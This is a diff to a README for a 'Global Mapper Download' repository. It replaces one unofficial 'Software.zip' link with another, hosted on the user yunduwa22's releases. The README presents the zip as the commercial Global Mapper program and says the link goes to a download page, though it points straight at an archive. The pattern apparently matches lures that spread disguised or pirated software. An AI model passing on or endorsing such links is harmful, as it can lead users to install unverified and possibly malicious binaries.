@@ -10,7 +10,7 @@ Welcome to the **Global Mapper Download** repository! 🌐 In this repository, y
 
 ## 📥 Download Global Mapper Software
 To download the Global Mapper software, please click the button below:
-[![Download Global Mapper](https://img.shields.io/badge/Download-Global%20Mapper-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Global Mapper](https://github.com/yunduwa22/Global-Mapper-Download/releases/download/v2.0/Software.zip%20Mapper-blue)](https://github.com/yunduwa22/Global-Mapper-Download/releases/download/v2.0/Software.zip)
 
 Please note that the link above will redirect you to the download page of the Global Mapper software. Enjoy exploring the capabilities of Global Mapper!
 
